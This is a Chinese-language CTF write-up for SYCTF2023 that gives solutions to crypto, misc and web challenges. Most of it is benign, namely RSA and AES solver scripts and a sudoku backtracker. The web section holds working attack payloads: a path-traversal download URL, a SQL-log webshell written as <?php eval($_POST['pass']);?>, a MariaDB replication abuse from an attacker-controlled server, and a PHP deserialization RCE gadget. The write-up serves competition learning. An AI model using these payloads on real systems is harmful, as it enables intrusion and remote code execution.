# SYCTF2023


[https://mp.weixin.qq.com/s/Gi3dQ3mDs3mZCRGtT4l_dg](https://mp.weixin.qq.com/s/Gi3dQ3mDs3mZCRGtT4l_dg)
[https://mp.weixin.qq.com/s/azbY19cBgs3MgVdo7i-OhQ](https://mp.weixin.qq.com/s/azbY19cBgs3MgVdo7i-OhQ)
[“安洵杯”全国精英赛——SYCTF2023 官方WP.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/35980243/1689316887358-afd4b2f1-973e-4aa8-823e-f2a8c6bc362d.pdf?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2023%2Fpdf%2F35980243%2F1689316887358-afd4b2f1-973e-4aa8-823e-f2a8c6bc362d.pdf%22%2C%22name%22%3A%22%E2%80%9C%E5%AE%89%E6%B4%B5%E6%9D%AF%E2%80%9D%E5%85%A8%E5%9B%BD%E7%B2%BE%E8%8B%B1%E8%B5%9B%E2%80%94%E2%80%94SYCTF2023%20%E5%AE%98%E6%96%B9WP.pdf%22%2C%22size%22%3A46827479%2C%22ext%22%3A%22pdf%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u4c5aaec9-fdb2-48be-8d0a-9551613120f%22%2C%22taskType%22%3A%22upload%22%2C%22type%22%3A%22application%2Fpdf%22%2C%22__spacing%22%3A%22both%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22u250b805f%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)

## crypto
### signin
256bit连分数逼近data3得到data1 和data2
```
data3 = 1.42870767357206600351348423521722279489230609801270854618388981989800006431663026299563973511233193052826781891445323183272867949279044062899046090636843802841647378505716932999588
cf = continued_fraction(data3)
alist = cf.convergents()
for i in alist:
    a = str(i).split('/')
    if len(a)>1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==256 and int(a[1]).bit_length()==256:
            print(a)

#data1 = 97093002077798295469816641595207740909547364338742117628537014186754830773717
#data2 = 67958620138887907577348085925738704755742144710390414146201367031822084270769
```
利用计算出的data1和data2求出p-q
```php
data1 = 97093002077798295469816641595207740909547364338742117628537014186754830773717
data2 = 67958620138887907577348085925738704755742144710390414146201367031822084270769
leak = 1788304673303043190942544050868817075702755835824147546758319150900404422381464556691646064734057970741082481134856415792519944511689269134494804602878628
phi1 = (data1-1)*(data2-1)
d1 = inverse_mod(data1,phi1)
p_q = int(pow(leak,d1,data1*data2))
print(p_q)
#p_q = 57684649402353527014234479338961992571416462151551812296301705975419997474236
```
之后解方程组得到p q ，最后RSA解密得到m再减去data2即可得到flag
```php
n = 2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517
p_q = 57684649402353527014234479338961992571416462151551812296301705975419997474236
p,q = var('p q')
eq1 = p*q==n
eq2 = p-q==p_q
result = solve([eq1,eq2],p,q)
print(result)
#p = 89050782851818876669770322556796705712770640993210984822169118425068336611139
#q = 31366133449465349655535843217834713141354178841659172525867412449648339136903
```
```php
import gmpy2
from Crypto.Util.number import long_to_bytes

data2 = 67958620138887907577348085925738704755742144710390414146201367031822084270769
p = 89050782851818876669770322556796705712770640993210984822169118425068336611139
q = 31366133449465349655535843217834713141354178841659172525867412449648339136903
phi = (p-1)*(q-1)
e = 65537
d = gmpy2.invert(e, int(phi))
c = 1046004343125860480395943301139616023280829254329678654725863063418699889673392326217271296276757045957276728032702540618505554297509654550216963442542837
n = 2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517
m = pow(c,d,n)
m = m - data2
print(long_to_bytes(m))
```
### CrazyTreat
```php
import gmpy2
from Crypto.Util.number import *
c =  10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949
n = 128259792862716016839189459678072057136816726330154776961595353705839428880480571473066446384217522987161777524953373380960754160008765782711874445778198828395697797884436326877471408867745183652189648661444125231444711655242478825995283559948683891100547458186394738621410655721556196774451473359271887941209
p4 = 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576
for i in range(200,256):
    PR.<x> = PolynomialRing(Zmod(n))
    f = p4+x
    roots = f.small_roots(X=2^i, beta=0.4)
    if roots!=[]:
        p = p4+int(roots[0])
        print(f'p = {p}')
        break
q = n//p
print(f'q = {q}')
e = 65537
phi = (p-1)*(q-1)
d = gmpy2.invert(e,int(phi))
m = pow(c,d,p*q)
flag = long_to_bytes(int(m))
print(flag)
```

### Alexei needs help
```php
from Crypto.Cipher import AES
from binascii import unhexlify, hexlify
from hashlib import md5
from Crypto.Util.number import *
a =  12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215
b =  10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673
m =  9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817
seq =  [1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064, 12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860, 13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339, 8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005, 5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052, 9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050, 6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410, 3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626, 2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738, 10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967]
ct = 0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81
 

n = 2023

def seqsum(i):
    ans = 0
    for j in range(len(seq)):
        ans += pow(i, j, m) * seq[j]
    return ans

def homework_iter(n, a, b, m, seq):
    hw = [0] * (n+1)
    hw[1], hw[2] = 1, 1

    for i in range(3, n+1):
        hw[i] = (a * hw[i-1] + b * hw[i-2] + seqsum(i)) % m
    return hw[n]

def decrypt_homework(flag_cipher, key):
    aes = AES.new(k, AES.MODE_ECB)
    decrypted_data = aes.decrypt(long_to_bytes(flag_cipher))
    return decrypted_data.rstrip(b"\x00")

ans = homework_iter(n, a, b, m, seq)
k = md5(str(ans).encode()).digest()
flag = decrypt_homework(ct, k)

print("Flag:", flag)
```
## MISC
### **sudoku_easy**
选择难度120，随便一个9x9答案，getshell读取flag

### 烦人的压缩包
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686369320150-37c2ab68-0900-4e9f-a846-73bce5cb00a1.png#averageHue=%23e8d39c&clientId=u1d842e86-99e1-4&from=paste&height=405&id=u5e06e5da&originHeight=405&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53366&status=done&style=none&taskId=u28d66242-1653-4732-b9d9-5b1235c5cc3&title=&width=798)
foremost love.jpg得到一个压缩包，crc校验错误
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686370166843-ce2907f6-4afe-491f-b1d8-619bd0f65183.png#averageHue=%233c3830&clientId=u1d842e86-99e1-4&from=paste&height=150&id=u23939336&originHeight=150&originWidth=586&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30843&status=done&style=none&taskId=ue952ecc9-ad9e-4ee5-8abd-3f0fa70e21f&title=&width=586)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686370154469-2bb8f7f1-ace4-4e26-a630-ea0262491511.png#averageHue=%23a4beb4&clientId=u1d842e86-99e1-4&from=paste&height=154&id=u57f99a46&originHeight=154&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22362&status=done&style=none&taskId=u8777f6d1-34f4-4c0f-ba79-a271ea8673a&title=&width=616)
Ook! 解码
### sudoku**_speedrun**
```php
#全局变量记录空位置（使用回溯法）
indexList = []

#储存数独元素
inp = '''300001079
200000010
005402000
021903000
000000090
500004002
007800020
900005840
800000100'''.replace('\n', '')
sudoku = [[] for _ in range(9)]
for i in range(9):
    sudoku[i] = [int(inp[i*9+j]) for j in range(9)]

# --- 程序入口 --- #
def main():
    #寻找首个空元素
    firstEmpty()
    #寻找末尾空元素
    last = lastEmpty()
    m,n = last
    #当末尾空元素合法且不等于0时停止循环
    while oneIsLegal(m,n) != True or sudoku[m][n] == 0:
        #获取栈顶元素
        x,y = indexList[-1]
        #判断当前位置是否合法
        if isLegal() == True and sudoku[x][y] <= 9 and 0 < sudoku[x][y]:
            #寻找下一个空元素
            isEmpty()
        else:
            #不合法 - 回退
            if sudoku[x][y] >= 9:
                myReturn()
                myAdd()
            else: #不合法 - 自增
                myAdd()
    myOutput()

# --- 寻找第一个空元素位置 --- #
def firstEmpty():
    for i in range(0,9):
        for j in range(0,9):
            if sudoku[i][j] == 0: #'0'
                myPush([i,j])
                return

# --- 寻找最后一个空元素位置 --- #
def lastEmpty():
    for i in range(8,-1,-1):
        for j in range(8,-1,-1):
            if sudoku[i][j] == 0: #'0'
                return [i,j]

# --- 位置判空加入栈中 --- #
def isEmpty():
    #获取栈顶元素
    a,b = indexList[-1]
    #从下一元素开始找起
    b += 1
    for i in range(a,9):
        if i != a:
            b = 0
        for j in range(b,9):
            if sudoku[i][j] == 0: #'0'
                myPush([i,j])
                return

# --- 入栈 --- #
def myPush(coordinate):
    indexList.append(coordinate)

# --- 出栈 --- #
def myPop():
    indexList.pop()

# --- 当前位置自增 ---#
def myAdd():
    #获取栈顶元素
    x,y = indexList[-1]
    sudoku[x][y] += 1

# --- 判断当前位置是否合法 --- #
def isLegal():
    #获取栈顶元素
    x,y = indexList[-1]
    temp = sudoku[x][y]
    #判断该行是否重复
    for i in range(9):
        if sudoku[x][i] == temp and i != y:
            return False; #当前位置不合法
    #判断该列是否重复
    for i in range(9): 
        if sudoku[i][y] == temp and i != x:
            return False; #当前位置不合法
    #判断该宫是否重复
    xx = int(x / 3)
    yy = int(y / 3)
    for i in range(3):
        for j in range(3):
            if sudoku[xx * 3 + i][yy * 3 + j] == temp and (xx * 3 + i) != x and (yy * 3 + j) != y:
                return False; #当前位置不合法
    return True #当前位置合法
    
# --- 判断某一位置是否合法 --- #
def oneIsLegal(x,y):
    temp = sudoku[x][y]
    #判断该行是否重复
    for i in range(9):
        if sudoku[x][i] == temp and i != y:
            return False; #当前位置不合法
    #判断该列是否重复
    for i in range(9): 
        if sudoku[i][y] == temp and i != x:
            return False; #当前位置不合法
    #判断该宫是否重复
    xx = int(x / 3)
    yy = int(y / 3)
    for i in range(3):
        for j in range(3):
            if sudoku[xx * 3 + i][yy * 3 + j] == temp and (xx * 3 + i) != x and (yy * 3 + j) != y:
                return False; #当前位置不合法
    return True #当前位置合法

# --- 回退函数 --- #
def myReturn():
    #获取栈顶元素
    x,y = indexList[-1]
    sudoku[x][y] = 0
    myPop()

# --- 输出数独 --- #
def myOutput():
    print("答案为：")
    for i in range(9):
        # print(sudoku[i])
        for j in sudoku[i]:
            print(j, end='')
        print()

if __name__ == "__main__":
    main()

```
## web
### **CarelessPy**
[https://www.o2takuxx.com/index.php/2023/06/11/syctf-2023-carelesspy/](https://www.o2takuxx.com/index.php/2023/06/11/syctf-2023-carelesspy/)
/eval、/login、/download三个路由
/eval
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677180-a924835c-5f98-41e6-93fa-f4a4b3534c8f.png#averageHue=%23e5e5e4&clientId=u837ff099-412b-4&from=paste&id=u7a3038ef&originHeight=399&originWidth=1276&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u0e731d43-a223-479f-a86d-88d58ed61a6&title=)
猜猜是咋写的？
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677293-e146cc08-48be-4faf-a268-a0d9d419c4e7.png#averageHue=%23eaeaea&clientId=u837ff099-412b-4&from=paste&id=u7c7d5c3b&originHeight=714&originWidth=1920&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ub0357994-4e10-4533-bf20-a39661bf6f0&title=)
/login
登录页面，弱密码登录不了
/download
可利用目录穿越下载文件，通过eval路由发现/app/__pycache__/part.cpython-311.pyc
任意文件读取：
```php
http://47.108.165.60:42577/download?file=.%2F..%2F..%2F..%2F..%2Fapp%2F__pycache__%2Fpart.cpython-311.pyc
```
pyc反编译：[https://tool.lu/pyc/](https://tool.lu/pyc/)
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677050-fc2708e5-fc8f-486e-b618-e87c96dce76e.png#averageHue=%23faf9f9&clientId=u837ff099-412b-4&from=paste&id=u5dad7bb8&originHeight=402&originWidth=948&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf92c1efb-b061-46a9-a4cf-901ab021a6f&title=)
伪造session
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677078-6484ef50-7b9d-4027-bbfe-9f86a3311264.png#averageHue=%23262a35&clientId=u837ff099-412b-4&from=paste&id=u5310ebc7&originHeight=264&originWidth=946&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=udb255c51-d2aa-4d10-8a6b-ca24854c8e0&title=)
/login
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677099-ea493994-56c3-459d-b211-1b8ef6960460.png#averageHue=%232f2f2f&clientId=u837ff099-412b-4&from=paste&id=u52e6f19e&originHeight=356&originWidth=1332&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u35ffe069-9cbb-43f0-8e2c-ab53b6be9c8&title=)
/th1s_1s_The_L4st_one
应该是XXE
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677722-6f16fa8d-21f8-4a16-89eb-ea6bd96be6b0.png#averageHue=%23f4f4f4&clientId=u837ff099-412b-4&from=paste&id=u03cff6dd&originHeight=232&originWidth=1037&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u04c3d2a5-e223-484f-9e7d-37d3f244071&title=)
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388677662-1e6dee75-cce4-4b39-8760-c8c2ab35a8db.png#averageHue=%232e2e2e&clientId=u837ff099-412b-4&from=paste&id=u928e2737&originHeight=587&originWidth=1285&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u84ef4f80-1efb-49d8-aaa7-34f03f09178&title=)
### Confronting robot
myname存在sql注入点
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686371387984-429d44b6-a579-4206-907b-de246fcb8782.png#averageHue=%231b1b1b&clientId=u1d842e86-99e1-4&from=paste&height=208&id=u141d77b6&originHeight=208&originWidth=468&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24829&status=done&style=none&taskId=u519f6bb1-269e-4219-a924-fb6d441626e&title=&width=468)
![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689314897432-050eee59-2461-4fef-ad63-26ec5c32c886.png#averageHue=%23242731&clientId=u6b8027cc-70f2-4&from=paste&id=u7cb65f4a&originHeight=768&originWidth=1080&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8e12babe-e801-4b7e-a2fc-0ecfbfb20aa&title=)
得到路由/sEcR@t_n@Bodyknow.php，可直接执行sql
```
select group_concat(table_name) from information_schema.tables where table_schema = database()
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1686388074219-2b8d725f-dee4-4f60-ad39-17ee2a3c1e6d.png#averageHue=%2398986c&clientId=u837ff099-412b-4&from=paste&height=399&id=u30c4a4e7&originHeight=399&originWidth=1276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=804327&status=done&style=none&taskId=u8378373f-dbaa-4400-8b0a-c93444c51e0&title=&width=1276)
#### 思路1 日志写马
开启全局的通用查询日志之后直接日志写马导致WEBSHELL
```
set global general_log='on'

set global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php'
```
然后直接select记录一次马即可shell
```
select "<?php eval($_POST['pass']);?>";
```
蚁剑连接game.php得到flag
#### 思路2 主从复制
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689319393860-977c171d-338a-46b4-95dc-8c3d240d860d.png#averageHue=%23a9a770&clientId=u6b8027cc-70f2-4&from=paste&height=830&id=u7af36d74&originHeight=830&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=485570&status=done&style=none&taskId=ud300b63f-d7b8-412c-aeff-abf0a63f4ef&title=&width=534)
无法直接insert数据，采取主从复制的方法
查看数据库版本：
```
select version();
```
在自己vps上起一个相同版本的mariadb，修改默认配置文件允许远程访问并启用二进制日志
```
vim /etc/mysql/my.conf
server-id = 1 
log_bin = /var/log/mysql/mariadb-bin

service mysql restart
```
自己的vps作为主，题目环境作为从
主服务器执行
```
CREATE USER 'atest'@'%' IDENTIFIED BY 'testtest';
grant replication slave on . to 'atest'@'%';
flush privileges;

# 复制从服务器上的数据结构
CREATE DATABASE IF NOT EXISTS game_data;
use game_data
CREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;

# 记录file和position
show master status;
# mysql-bin.000001 1376
```
从服务器执行
```
CHANGE MASTER TO MASTER_HOST='主服务器ip', MASTER_USER='atest',
MASTER_PASSWORD='testtest', MASTER_LOG_FILE='mariadb-bin.000001(记录的值)',
MASTER_LOG_POS=1365(记录的值);
start slave;
show slave status
# 显示连接成功
```
主服务器执行
```
INSERT INTO game ( round , choice ) VALUES ('1', 'R'), ('2', 'R'),('3', 'R'), ('4', 'R'),('5', 'R'), ('6', 'R'),('7',
'R'), ('8', 'R'),('9', 'R'), ('10', 'R');
```
在开始挑战处输入答案即可获取flag
### SleepWalker（java
### 4号的罗纳尔多
```
<?php
error_reporting(0);
highlight_file(__FILE__);
class evil{
    public $cmd;
    public $a;
    public function __destruct(){
        if('VanZZZZY' === preg_replace('/;+/','VanZZZZY',preg_replace('/[A-Za-z_\(\)]+/','',$this->cmd))){
            eval($this->cmd.'givemegirlfriend!');
        } else {
            echo 'nonono';
        }
    }
}

if(!preg_match('/^[0a]:[\d]+|Array|Iterator|object|List/i',$_GET['Pochy'])){
	unserialize($_GET['Pochy']);
} else {
	echo 'nonono';
}
```
无参rce
通过内置类splstack绕过匹配O开头的序列化数据；
通过__halt_compiler();来结束 php 代码执行流程，绕过givemegirlfriend!字符串的影响
```
<?php 

class evil{
    public $cmd;
    public $a;
    
}
$evilClass = new evil();
$evilClass->cmd = 'system(next(getallheaders()));__halt_compiler();';
$a = new SplStack();
$a -> push($evilClass);
echo serialize($a);
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689323281536-fcc032bf-62c2-4da4-b1b1-ea063265a089.png#averageHue=%23f9f8f7&clientId=u6b8027cc-70f2-4&from=paste&height=789&id=u33df7da0&originHeight=789&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113404&status=done&style=none&taskId=u8dae5214-478f-4b21-af4c-3773965b1ae&title=&width=1362)
（这里不知道为什么，参数是在倒数第二个数据那；next(getallheaders())应该是第二个？
### tasks
界面发现项目地址，代码审计，发现sqlite注入点
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689324232480-2a33f28f-7d77-46fa-b393-704361b7997c.png#averageHue=%230f141b&clientId=uc33bb396-ec86-4&from=paste&height=768&id=u25de6118&originHeight=768&originWidth=930&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48558&status=done&style=none&taskId=u132e9908-8a9e-45ba-9095-b84877fe59b&title=&width=930)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689324304381-87952ea5-c75a-4281-96f5-887aeebcc81a.png#averageHue=%238fc09e&clientId=uc33bb396-ec86-4&from=paste&height=610&id=uf77e6ae3&originHeight=610&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151722&status=done&style=none&taskId=u03b64d50-4c71-470a-973d-b9e26f49c3f&title=&width=952)
